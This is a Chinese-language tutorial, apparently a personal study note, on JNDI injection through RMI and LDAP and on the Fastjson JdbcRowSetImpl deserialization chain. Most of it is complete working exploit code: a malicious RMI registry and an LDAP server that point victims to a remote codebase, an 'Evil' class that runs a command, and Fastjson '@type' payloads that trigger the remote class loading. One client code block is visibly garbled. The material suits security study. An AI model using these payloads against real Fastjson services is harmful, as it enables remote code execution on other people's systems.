##  JDNI基础注入篇中

限制：6u132,7u122,8u133

RMI+reference进行注入

利用了RMI服务端

```java
package fastjson.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception {
        String url = "http://127.0.0.1:1098/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Evil", "Evil", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hack",referenceWrapper);
        System.out.println("server running");
    }
}

```

Client客户端：

利用JdbcRowImpl链子进行注入

```java
/*12age fastjson.jndi;

import   

public class Client {
    public static void main(String[] args) throws Exception{
        JdbcRowSetImpl jdbcRowSet=new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("rmi://127.0.0.1:1099/hack");
        jdbcRowSet.execute();
    }
}

```

Evil类：

```java
public class Evil {
    public Evil() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

注意`Evil`类不能带包名，同时生成`Evil.class`的java的版本需要相同

## Fastjson中JNDI注入--JdbcRowSetImpl 利用链

> jdk 版本：≤ 6u141、7u131、8u121
>
> 使用高版本需加入 jvm 参数：`-Dcom.sun.jndi.rmi.object.trustURLCodebase=true`，因为 8u121 版本后默认关闭了`com.sun.jndi.rmi.object.trustURLCodebase`
>
> Fastjson版本：1.22--1.24

我们知道fastjson中`parse`会调用属性的setter方法

注意两个方法：

```java
public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }
    }
```

由于第一次初始化conn=null，所以进入`connect`函数

```java
private Connection connect() throws SQLException {
        if (this.conn != null) {
            return this.conn;
        } else if (this.getDataSourceName() != null) {
            try {
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
       ......
```

这个位置就实现JNDI注入(结合RMI)

我们现在需要通过`getDataSourceName`方法,改变`DataSourceName`的值，看他的setter

```java
public void setDataSourceName(String var1) throws SQLException {
        if (this.getDataSourceName() != null) {
            if (!this.getDataSourceName().equals(var1)) {
                super.setDataSourceName(var1);
                this.conn = null;
                this.ps = null;
                this.rs = null;
            }
        } else {
            super.setDataSourceName(var1);//进入
        }

    }
```

```java
public void setDataSourceName(String name) throws SQLException {

        if (name == null) {
            dataSource = null;
        } else if (name.equals("")) {
           throw new SQLException("DataSource name cannot be empty string");
        } else {
           dataSource = name;
        }

        URL = null;
    }
```

不需要任何条件就可以修改

直接构造payload：`autoCommit`设置为true,false都可以，只是为了调用`setAutoCommit`方法

```java
String jsonString="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/hack\",\"autoCommit\":true}";
        JSON.parse(jsonString);
```

完整的类：

### JNDI+RMI

RMIServer:

```java
package fastjson.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception {
        String url = "http://127.0.0.1:1098/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Evil", "Evil", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hack",referenceWrapper);
        System.out.println("server running");
    }
}

```

触发类：

```java
package fastjson.jndi;

import com.alibaba.fastjson.JSON;

public class fast {
    public static void main(String[] args) {
        String jsonString="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/hack\",\"autoCommit\":true}";
        JSON.parse(jsonString);
    }
}

```

Evil类也是一样。然后用python起一个1098端口的服务即可

### JNDI+Ldap

LdapServer服务：

```java
package JNDI;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LdapServer {
    public static void main(String[] args) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("127.0.0.1"),
                1234,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
        directoryServer.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor{
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            String className = "Evil";
            String url = "http://127.0.0.1:1098/";

            Entry entry = new Entry(base);
            entry.addAttribute("javaClassName", className);
            entry.addAttribute("javaFactory", className);
            entry.addAttribute("javaCodeBase", url);
            entry.addAttribute("objectClass", "javaNamingReference");

            try {
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
}
```

触发类

```java
package fastjson.jndi;

import com.alibaba.fastjson.JSON;
public class fast_ldap {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/hack\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}

```

